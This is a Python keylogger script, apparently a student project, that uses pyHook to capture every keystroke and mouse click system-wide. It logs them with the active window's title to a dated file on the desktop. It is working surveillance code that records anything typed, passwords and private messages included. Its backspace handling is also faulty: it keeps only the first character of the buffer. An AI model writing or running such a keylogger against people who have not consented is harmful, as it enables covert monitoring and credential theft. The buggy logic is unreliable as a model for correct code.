import pyHook, pythoncom, sys, logging
from datetime import datetime

datetoday = datetime.now().strftime("%Y-%b-%d")

linebuffer = ""

tabname = ""

filelog = "C:\\Users\\Bea\\Desktop\\[LIS 198] Final Project\\"+ datetoday +" Log.txt"

def SaveLine(line):
	filetoday = open(filelog, "a")
	filetoday.write(line)
	filetoday.close()

def KeyboardLogging(event):
	global linebuffer
	global tabname
	if(tabname != event.WindowName):
		if(linebuffer != ""):
			linebuffer += "\n"
			SaveLine(linebuffer)
		linebuffer = ""
		SaveLine("\n Window Name: " + event.WindowName + "\n")
		tabname = event.WindowName
	if(event.Ascii == 13 or event.Ascii == 9):
		linebuffer += "\n"
		SaveLine(linebuffer)
		linebuffer = ""
		return True
	if(event.Ascii == 8):
		linebuffer = linebuffer[:1]
		return True
	if(event.Ascii < 32 or event.Ascii > 126):
		if(event.Ascii == 0):
			pass
		else:
			linebuffer = linebuffer + "\n" + str(event.Ascii) + "\n"
	else:
		linebuffer += chr(event.Ascii)
		return True
	return True
	
def LeftClick(event):
	SaveLine("left mouse click" + "\n")
	return True
	
def RightClick(event):
	SaveLine("right mouse click" + "\n")
	return True
		
hooks_manager = pyHook.HookManager()

hooks_manager.KeyDown = KeyboardLogging

hooks_manager.HookKeyboard()

hooks_manager.SubscribeMouseLeftDown(LeftClick)

hooks_manager.SubscribeMouseRightDown(RightClick)

hooks_manager.HookMouse()

pythoncom.PumpMessages()